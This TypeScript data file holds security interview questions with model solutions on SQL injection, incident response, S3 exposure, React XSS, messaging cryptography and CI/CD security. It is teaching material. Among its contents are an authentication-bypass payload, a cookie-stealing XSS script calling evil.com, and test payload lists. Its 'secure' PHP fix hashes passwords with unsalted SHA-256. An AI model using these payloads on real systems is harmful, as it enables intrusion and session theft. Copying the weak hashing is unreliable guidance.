export interface TechnicalQuestion {
  id: string;
  company: string;
  position: string;
  difficulty: 'junior' | 'mid' | 'senior' | 'principal';
  category: string;
  question: string;
  hints: string[];
  solution: string;
  explanation: string;
  followUpQuestions?: string[];
  tags: string[];
  timeLimit: number; // in minutes
}

export const technicalQuestions: TechnicalQuestion[] = [
  {
    id: 'google-1',
    company: 'Google',
    position: 'Security Engineer',
    difficulty: 'mid',
    category: 'Web Security',
    question: `You discover that a web application is vulnerable to SQL injection. The application uses the following PHP code:

$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "' AND password = '" . $_POST['password'] . "'";

1. Demonstrate how an attacker could bypass authentication
2. Explain the impact of this vulnerability
3. Provide a secure code implementation
4. What additional security measures would you recommend?`,
    hints: [
      "Think about how SQL comments work and how they can terminate queries early",
      "Consider what happens when you inject SQL syntax into the username field",
      "Look into prepared statements and parameterized queries",
      "Think about defense in depth - what other layers of security could help?"
    ],
    solution: `**1. Authentication Bypass:**
An attacker could use the following payload in the username field:
\`admin'--\`

This would result in the query:
\`SELECT * FROM users WHERE username = 'admin'--' AND password = ''\`

The \`--\` comments out the password check, allowing login as admin without knowing the password.

**2. Impact:**
- Complete authentication bypass
- Unauthorized access to user accounts
- Potential data exfiltration
- Privilege escalation
- Database manipulation/deletion

**3. Secure Implementation:**
\`\`\`php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$_POST['username'], hash('sha256', $_POST['password'])]);
$user = $stmt->fetch();
\`\`\`

**4. Additional Security Measures:**
- Input validation and sanitization
- Rate limiting for login attempts
- Multi-factor authentication
- Password hashing with salt
- Web Application Firewall (WAF)
- Regular security audits`,
    explanation: `This is a classic SQL injection vulnerability caused by string concatenation in SQL queries. The key insight is understanding how SQL comments (\`--\`) can be used to bypass authentication logic. The secure solution uses prepared statements which separate SQL logic from data, preventing injection attacks.`,
    followUpQuestions: [
      "How would you detect this vulnerability in a large codebase?",
      "What tools would you use for automated SQL injection testing?",
      "How would you implement logging to detect such attacks?"
    ],
    tags: ['SQL Injection', 'Authentication', 'Web Security', 'PHP'],
    timeLimit: 30
  },
  {
    id: 'microsoft-1',
    company: 'Microsoft',
    position: 'Cybersecurity Analyst',
    difficulty: 'senior',
    category: 'Network Security',
    question: `You're investigating a potential APT (Advanced Persistent Threat) in your network. You have the following indicators:

1. Unusual outbound traffic to IP 185.243.115.84 on port 443
2. PowerShell execution with base64 encoded commands
3. Scheduled tasks created with suspicious names
4. Registry modifications in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

Analyze this scenario and provide:
1. Your investigation methodology
2. Tools you would use
3. How to contain the threat
4. Long-term prevention strategies`,
    hints: [
      "Think about the kill chain - what stage of attack does each indicator represent?",
      "Consider both host-based and network-based investigation techniques",
      "Think about isolation vs. monitoring - when would you choose each?",
      "Consider threat intelligence and IOC sharing"
    ],
    solution: `**1. Investigation Methodology:**

**Phase 1: Initial Assessment**
- Isolate affected systems (network segmentation)
- Preserve evidence (memory dumps, disk images)
- Document timeline of events
- Assess scope of compromise

**Phase 2: Technical Analysis**
- Decode PowerShell base64 commands
- Analyze network traffic patterns
- Examine scheduled tasks and registry entries
- Check for lateral movement indicators

**Phase 3: Threat Attribution**
- Compare IOCs with threat intelligence feeds
- Analyze TTPs (Tactics, Techniques, Procedures)
- Determine attack vector and timeline

**2. Tools:**
- **Network Analysis:** Wireshark, Zeek, Suricata
- **Host Analysis:** Volatility, YARA, Sysinternals
- **Threat Intelligence:** MISP, OpenIOC, STIX/TAXII
- **SIEM:** Splunk, ELK Stack, QRadar
- **Forensics:** Autopsy, FTK, EnCase

**3. Containment Strategy:**
- Immediate: Block C2 IP at firewall
- Network segmentation of affected hosts
- Disable compromised accounts
- Update endpoint detection rules
- Monitor for additional IOCs

**4. Long-term Prevention:**
- Implement Zero Trust architecture
- Enhanced endpoint detection and response (EDR)
- Regular threat hunting exercises
- Employee security awareness training
- Incident response plan updates`,
    explanation: `This scenario represents a typical APT investigation requiring systematic analysis of multiple indicators. The key is understanding the attack lifecycle and using appropriate tools for each phase of investigation. The outbound traffic suggests command and control communication, while PowerShell and persistence mechanisms indicate established access.`,
    followUpQuestions: [
      "How would you handle this if it occurred in a cloud environment?",
      "What legal considerations might apply to this investigation?",
      "How would you coordinate with external threat intelligence sources?"
    ],
    tags: ['APT', 'Incident Response', 'Network Security', 'Forensics'],
    timeLimit: 45
  },
  {
    id: 'amazon-1',
    company: 'Amazon',
    position: 'Cloud Security Engineer',
    difficulty: 'senior',
    category: 'Cloud Security',
    question: `An AWS S3 bucket containing sensitive customer data was accidentally made public. The bucket contained:
- Customer PII (personally identifiable information)
- Payment card data
- Internal application logs
- Database backups

The exposure lasted for 6 hours before detection. Provide:
1. Immediate response actions
2. Investigation steps
3. Compliance considerations
4. Prevention measures for the future`,
    hints: [
      "Think about data breach notification requirements and timelines",
      "Consider what logs and monitoring could help determine the scope",
      "Think about AWS-specific tools for bucket analysis and access logging",
      "Consider both technical and business impact assessment"
    ],
    solution: `**1. Immediate Response Actions:**

**Hour 0-1: Containment**
- Immediately secure the S3 bucket (remove public access)
- Enable S3 access logging if not already enabled
- Take snapshot of current bucket permissions
- Notify incident response team and legal counsel
- Begin documentation of all actions

**Hour 1-4: Assessment**
- Review CloudTrail logs for bucket access
- Check S3 server access logs for external requests
- Identify what data was potentially accessed
- Assess scope of exposure using AWS Config

**2. Investigation Steps:**
\`\`\`bash
# Check bucket access logs
aws s3 cp s3://bucket-logs/ . --recursive

# Review CloudTrail for bucket policy changes
aws logs filter-log-events --log-group-name CloudTrail-LogGroup 
  --filter-pattern "{ $.eventName = PutBucketPolicy || $.eventName = PutBucketAcl }"

# Analyze access patterns
aws s3api get-bucket-logging --bucket sensitive-bucket
\`\`\`

**3. Compliance Considerations:**
- **GDPR:** 72-hour breach notification requirement
- **PCI DSS:** Immediate notification to card brands
- **CCPA:** Consumer notification within reasonable timeframe
- **SOX:** Financial data exposure reporting
- **HIPAA:** If health data involved, 60-day notification

**4. Prevention Measures:**
\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyPublicAccess",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": ["arn:aws:s3:::bucket/*"],
      "Condition": {
        "StringNotEquals": {
          "aws:PrincipalServiceName": ["ec2.amazonaws.com"]
        }
      }
    }
  ]
}
\`\`\`

**Additional Measures:**
- Enable S3 Block Public Access at account level
- Implement bucket policy automation
- Set up CloudWatch alarms for policy changes
- Regular access reviews and audits
- Data classification and encryption`,
    explanation: `This scenario tests understanding of cloud security incident response, compliance requirements, and AWS-specific security controls. The key is balancing immediate containment with thorough investigation while meeting various regulatory notification requirements.`,
    followUpQuestions: [
      "How would you handle this in a multi-cloud environment?",
      "What if the data was encrypted - how would that change your response?",
      "How would you calculate the potential financial impact?"
    ],
    tags: ['Cloud Security', 'AWS', 'Data Breach', 'Compliance'],
    timeLimit: 40
  },
  {
    id: 'facebook-1',
    company: 'Meta (Facebook)',
    position: 'Security Engineer',
    difficulty: 'mid',
    category: 'Application Security',
    question: `You're reviewing a React application and find the following code:

\`\`\`javascript
function UserProfile({ userId }) {
  const [userData, setUserData] = useState(null);
  
  useEffect(() => {
    fetch(\`/api/user/\${userId}\`)
      .then(response => response.json())
      .then(data => setUserData(data));
  }, [userId]);
  
  return (
    <div>
      <h1>Welcome {userData?.name}</h1>
      <div dangerouslySetInnerHTML={{__html: userData?.bio}} />
      <img src={userData?.avatar} alt="User avatar" />
    </div>
  );
}
\`\`\`

Identify security vulnerabilities and provide secure alternatives.`,
    hints: [
      "Look at how user input is being rendered in the DOM",
      "Consider what could happen if userData.bio contains malicious content",
      "Think about input validation and output encoding",
      "Consider Content Security Policy as an additional defense"
    ],
    solution: `**Identified Vulnerabilities:**

**1. Cross-Site Scripting (XSS) via dangerouslySetInnerHTML**
The \`userData?.bio\` is directly inserted into the DOM without sanitization.

**Attack Example:**
\`\`\`javascript
// Malicious bio content:
"<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"
\`\`\`

**2. Potential IDOR (Insecure Direct Object Reference)**
No validation that the current user can access the requested userId.

**3. Missing Input Validation**
No validation of userId parameter before making API call.

**Secure Implementation:**

\`\`\`javascript
import DOMPurify from 'dompurify';

function UserProfile({ userId }) {
  const [userData, setUserData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  
  useEffect(() => {
    // Input validation
    if (!userId || !/^[0-9]+$/.test(userId)) {
      setError('Invalid user ID');
      setLoading(false);
      return;
    }
    
    fetch(\`/api/user/\${encodeURIComponent(userId)}\`, {
      headers: {
        'Authorization': \`Bearer \${getAuthToken()}\`,
        'Content-Type': 'application/json'
      }
    })
    .then(response => {
      if (!response.ok) {
        throw new Error('Failed to fetch user data');
      }
      return response.json();
    })
    .then(data => {
      setUserData(data);
      setLoading(false);
    })
    .catch(err => {
      setError(err.message);
      setLoading(false);
    });
  }, [userId]);
  
  if (loading) return <div>Loading...</div>;
  if (error) return <div>Error: {error}</div>;
  
  return (
    <div>
      <h1>Welcome {userData?.name}</h1>
      {/* Safe HTML rendering with sanitization */}
      <div dangerouslySetInnerHTML={{
        __html: DOMPurify.sanitize(userData?.bio || '')
      }} />
      {/* Input validation for image URL */}
      <img 
        src={userData?.avatar?.startsWith('https://') ? userData.avatar : '/default-avatar.png'} 
        alt="User avatar"
        onError={(e) => { e.target.src = '/default-avatar.png'; }}
      />
    </div>
  );
}
\`\`\`

**Additional Security Measures:**

**1. Content Security Policy:**
\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' https:;
\`\`\`

**2. Backend Validation:**
\`\`\`javascript
// API endpoint should validate authorization
app.get('/api/user/:id', authenticateUser, (req, res) => {
  const userId = parseInt(req.params.id);
  
  // Check if user can access this profile
  if (!canUserAccessProfile(req.user.id, userId)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // Return sanitized data
  const userData = getUserData(userId);
  res.json({
    name: sanitize(userData.name),
    bio: sanitize(userData.bio),
    avatar: validateImageUrl(userData.avatar)
  });
});
\`\`\``,
    explanation: `This code demonstrates common React security vulnerabilities, particularly XSS through dangerouslySetInnerHTML. The solution involves input validation, output encoding, proper error handling, and defense-in-depth strategies including CSP.`,
    followUpQuestions: [
      "How would you implement automated security testing for this component?",
      "What other React security best practices should be followed?",
      "How would you handle file uploads securely in this context?"
    ],
    tags: ['XSS', 'React', 'Application Security', 'Frontend Security'],
    timeLimit: 35
  },
  {
    id: 'apple-1',
    company: 'Apple',
    position: 'Security Architect',
    difficulty: 'principal',
    category: 'Cryptography',
    question: `Design a secure messaging system for a mobile application that requires:

1. End-to-end encryption
2. Perfect forward secrecy
3. Protection against man-in-the-middle attacks
4. Scalability to millions of users
5. Offline message delivery

Provide the cryptographic protocol design, key management strategy, and implementation considerations.`,
    hints: [
      "Consider the Signal Protocol or similar double ratchet algorithms",
      "Think about key exchange mechanisms and identity verification",
      "Consider how to handle key rotation and compromise scenarios",
      "Think about the infrastructure needed for key distribution and message routing"
    ],
    solution: `**Cryptographic Protocol Design:**

**1. Key Exchange Protocol (X3DH - Extended Triple Diffie-Hellman):**

\`\`\`
Alice -> Server: Identity Key (IK_A), Signed Prekey (SPK_A), One-time Prekeys (OPK_A)
Bob -> Server: Identity Key (IK_B), Signed Prekey (SPK_B), One-time Prekeys (OPK_B)

When Alice wants to message Bob:
1. Alice fetches Bob's key bundle from server
2. Alice generates ephemeral key (EK_A)
3. Alice computes shared secret:
   DH1 = DH(IK_A, SPK_B)
   DH2 = DH(EK_A, IK_B)
   DH3 = DH(EK_A, SPK_B)
   DH4 = DH(EK_A, OPK_B)  // if available
   
   SK = KDF(DH1 || DH2 || DH3 || DH4)
\`\`\`

**2. Double Ratchet for Perfect Forward Secrecy:**

\`\`\`python
class DoubleRatchet:
    def __init__(self, shared_key, public_key):
        self.root_key = shared_key
        self.chain_key_send = None
        self.chain_key_recv = None
        self.public_key = public_key
        self.private_key = generate_keypair()
        
    def encrypt_message(self, plaintext):
        # Advance sending chain
        self.chain_key_send, message_key = kdf_chain(self.chain_key_send)
        
        # Encrypt with AES-256-GCM
        ciphertext = aes_gcm_encrypt(message_key, plaintext)
        
        # Include current public key for ratchet step
        return {
            'ciphertext': ciphertext,
            'public_key': self.public_key,
            'counter': self.send_counter
        }
        
    def decrypt_message(self, message):
        # Perform DH ratchet step if new public key
        if message['public_key'] != self.remote_public_key:
            self.dh_ratchet(message['public_key'])
            
        # Derive message key and decrypt
        message_key = derive_message_key(self.chain_key_recv, message['counter'])
        return aes_gcm_decrypt(message_key, message['ciphertext'])
\`\`\`

**3. Identity Verification (Safety Numbers):**

\`\`\`python
def generate_safety_number(identity_key_a, identity_key_b):
    combined = identity_key_a + identity_key_b
    hash_output = sha256(combined)
    
    # Convert to 60-digit number for user verification
    safety_number = ""
    for i in range(0, 30, 5):
        chunk = int.from_bytes(hash_output[i:i+5], 'big')
        safety_number += f"{chunk % 100000:05d}"
    
    return safety_number
\`\`\`

**4. Key Management Infrastructure:**

\`\`\`yaml
# Key Server Architecture
components:
  - identity_service:
      purpose: "Manage long-term identity keys"
      storage: "HSM-backed secure storage"
      replication: "Multi-region with consistency"
      
  - prekey_service:
      purpose: "Distribute one-time prekeys"
      storage: "Encrypted database"
      rotation: "Automatic replenishment"
      
  - message_relay:
      purpose: "Store encrypted messages for offline delivery"
      retention: "7 days maximum"
      encryption: "Additional layer with server keys"

security_measures:
  - certificate_transparency: "Public log of identity key changes"
  - key_pinning: "Pin identity keys in client applications"
  - abuse_detection: "Monitor for suspicious key rotation patterns"
\`\`\`

**5. Implementation Considerations:**

**Client-Side Security:**
\`\`\`swift
// iOS Secure Enclave integration
class SecureKeyManager {
    func generateIdentityKey() -> SecKey {
        let attributes: [String: Any] = [
            kSecAttrKeyType as String: kSecAttrKeyTypeECSECPrimeRandom,
            kSecAttrKeySizeInBits as String: 256,
            kSecAttrTokenID as String: kSecAttrTokenIDSecureEnclave,
            kSecPrivateKeyAttrs as String: [
                kSecAttrIsPermanent as String: true,
                kSecAttrApplicationTag as String: "com.app.identity-key"
            ]
        ]
        
        var error: Unmanaged<CFError>?
        guard let privateKey = SecKeyCreateRandomKey(attributes as CFDictionary, &error) else {
            fatalError("Failed to generate key: \\(error!.takeRetainedValue())")
        }
        
        return privateKey
    }
}
\`\`\`

**Scalability Architecture:**
- **Horizontal sharding** of key servers by user ID hash
- **CDN distribution** of public key bundles
- **Message queuing** for offline delivery with exponential backoff
- **Rate limiting** to prevent abuse and DoS attacks

**Compromise Recovery:**
- **Key rotation** protocol for compromised devices
- **Out-of-band verification** for identity key changes
- **Backward secrecy** through regular key deletion
- **Audit logging** for security monitoring`,
    explanation: `This design combines proven cryptographic protocols (X3DH + Double Ratchet) with practical implementation considerations for a production messaging system. The key insight is balancing security, usability, and scalability while providing strong guarantees against various attack scenarios.`,
    followUpQuestions: [
      "How would you handle group messaging with these same security properties?",
      "What are the trade-offs between security and performance in mobile environments?",
      "How would you implement secure backup and recovery of message history?"
    ],
    tags: ['Cryptography', 'Protocol Design', 'Mobile Security', 'End-to-End Encryption'],
    timeLimit: 60
  },
  {
    id: 'netflix-1',
    company: 'Netflix',
    position: 'Security Engineer',
    difficulty: 'mid',
    category: 'DevSecOps',
    question: `You need to implement security in a CI/CD pipeline for a microservices architecture. The pipeline should include:

1. Static code analysis
2. Dependency vulnerability scanning
3. Container security scanning
4. Dynamic security testing
5. Infrastructure as Code security validation

Design the pipeline and provide implementation details for each security gate.`,
    hints: [
      "Think about where each security check should be placed in the pipeline",
      "Consider both blocking and non-blocking security checks",
      "Think about how to handle security findings and developer feedback",
      "Consider the balance between security and development velocity"
    ],
    solution: `**Secure CI/CD Pipeline Design:**

\`\`\`yaml
# .github/workflows/secure-pipeline.yml
name: Secure CI/CD Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  security-gates:
    runs-on: ubuntu-latest
    
    steps:
    # 1. Static Code Analysis
    - name: Checkout code
      uses: actions/checkout@v3
      
    - name: SonarQube Security Scan
      uses: sonarqube-quality-gate-action@master
      with:
        scanMetadataReportFile: target/sonar/report-task.txt
      env:
        SONAR_TOKEN: \${{ secrets.SONAR_TOKEN }}
        
    - name: Semgrep SAST
      uses: returntocorp/semgrep-action@v1
      with:
        config: >-
          p/security-audit
          p/secrets
          p/owasp-top-ten
          
    # 2. Dependency Vulnerability Scanning
    - name: OWASP Dependency Check
      uses: dependency-check/Dependency-Check_Action@main
      with:
        project: 'microservice'
        path: '.'
        format: 'ALL'
        
    - name: Snyk Vulnerability Scan
      uses: snyk/actions/node@master
      env:
        SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
      with:
        args: --severity-threshold=high
        
    # 3. Container Security Scanning
    - name: Build Docker Image
      run: docker build -t app:latest .
      
    - name: Trivy Container Scan
      uses: aquasecurity/trivy-action@master
      with:
        image-ref: 'app:latest'
        format: 'sarif'
        output: 'trivy-results.sarif'
        
    - name: Anchore Container Scan
      uses: anchore/scan-action@v3
      with:
        image: "app:latest"
        fail-build: true
        severity-cutoff: high
        
    # 4. Infrastructure as Code Security
    - name: Terraform Security Scan
      uses: bridgecrewio/checkov-action@master
      with:
        directory: ./terraform
        framework: terraform
        
    - name: CloudFormation Security Scan
      run: |
        cfn-lint cloudformation/*.yaml
        cfn_nag_scan --input-path cloudformation/
        
    # 5. Dynamic Security Testing
    - name: Deploy to Test Environment
      run: |
        kubectl apply -f k8s/test/
        
    - name: OWASP ZAP Baseline Scan
      uses: zaproxy/action-baseline@v0.7.0
      with:
        target: 'https://test-app.example.com'
        
    - name: Nuclei Security Scan
      uses: projectdiscovery/nuclei-action@main
      with:
        target: 'https://test-app.example.com'
        templates: 'cves,vulnerabilities,misconfiguration'
\`\`\`

**Security Gate Implementation Details:**

**1. Static Code Analysis Configuration:**

\`\`\`python
# .semgrep.yml
rules:
  - id: hardcoded-secrets
    pattern: |
      password = "..."
    message: "Hardcoded password detected"
    severity: ERROR
    languages: [python, javascript, java]
    
  - id: sql-injection
    pattern: |
  cursor.execute("SELECT * FROM users WHERE id = " + $USER_INPUT)
    message: "Potential SQL injection vulnerability"
    severity: ERROR
    languages: [python]
    
  - id: xss-vulnerability
    pattern: |
  innerHTML = $USER_INPUT
    message: "Potential XSS vulnerability"
    severity: ERROR
    languages: [javascript]
\`\`\`

**2. Dependency Scanning with Policy:**

\`\`\`json
{
  "snyk": {
    "policies": {
      "SNYK-JS-LODASH-567746": {
        "reason": "No fix available, risk accepted",
        "expires": "2024-12-31T23:59:59.999Z"
      }
    },
    "severity-threshold": "high",
    "fail-on": "upgradable"
  }
}
\`\`\`

**3. Container Security Policy:**

\`\`\`yaml
# .trivyignore
CVE-2021-44228  # Log4j - not applicable to our stack
CVE-2022-12345  # Fixed in next release

# Dockerfile security best practices
FROM node:16-alpine AS builder
RUN addgroup -g 1001 -S nodejs
RUN adduser -S nextjs -u 1001

# Security scanning in Dockerfile
RUN apk add --no-cache dumb-init
USER nextjs
EXPOSE 3000
ENTRYPOINT ["dumb-init", "--"]
CMD ["node", "server.js"]
\`\`\`

**4. Dynamic Security Testing:**

\`\`\`python
# Custom security test suite
import requests
import pytest

class TestSecurityHeaders:
    def test_security_headers(self, base_url):
        response = requests.get(f"{base_url}/")
        
        # Check for security headers
        assert 'X-Content-Type-Options' in response.headers
        assert 'X-Frame-Options' in response.headers
        assert 'Strict-Transport-Security' in response.headers
        assert 'Content-Security-Policy' in response.headers
        
    def test_authentication_bypass(self, base_url):
        # Test for common auth bypass techniques
        payloads = ["admin'--", "' OR 1=1--", "admin' /*"]
        
        for payload in payloads:
            response = requests.post(f"{base_url}/login", {
                'username': payload,
                'password': 'test'
            })
            assert response.status_code != 200
            
    def test_xss_protection(self, base_url):
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>"
        ]
        
        for payload in xss_payloads:
            response = requests.post(f"{base_url}/search", {
                'query': payload
            })
            assert payload not in response.text
\`\`\`

**5. Security Metrics and Reporting:**

\`\`\`python
# Security dashboard integration
class SecurityMetrics:
    def __init__(self):
        self.metrics = {
            'vulnerabilities_found': 0,
            'vulnerabilities_fixed': 0,
            'security_tests_passed': 0,
            'security_tests_failed': 0
        }
    
    def report_to_dashboard(self):
        # Send metrics to security dashboard
        dashboard_api.post('/metrics', self.metrics)
        
    def fail_build_on_critical(self, scan_results):
        critical_vulns = [v for v in scan_results if v.severity == 'CRITICAL']
        if critical_vulns:
            raise Exception(f"Build failed: {len(critical_vulns)} critical vulnerabilities found")
\`\`\`

**6. Security Policy Enforcement:**

\`\`\`yaml
# security-policy.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: security-policy
data:
  policy.rego: |
    package security
    
    # Deny containers running as root
    deny[msg] {
      input.spec.securityContext.runAsUser == 0
      msg := "Container must not run as root"
    }
    
    # Require security scanning
    deny[msg] {
      not input.metadata.annotations["security.scan.status"]
      msg := "Container must be security scanned"
    }
    
    # Enforce resource limits
    deny[msg] {
      not input.spec.containers[_].resources.limits
      msg := "Container must have resource limits"
    }
\`\`\``,
    explanation: `This comprehensive DevSecOps pipeline integrates security at every stage of the development lifecycle. The key is implementing security as code with automated gates that provide fast feedback to developers while maintaining security standards. The pipeline balances security rigor with development velocity through configurable policies and risk-based decision making.`,
    followUpQuestions: [
      "How would you handle security exceptions and risk acceptance in this pipeline?",
      "What metrics would you track to measure the effectiveness of your security program?",
      "How would you implement security testing for serverless applications?"
    ],
    tags: ['DevSecOps', 'CI/CD', 'Container Security', 'SAST', 'DAST'],
    timeLimit: 50
  }
];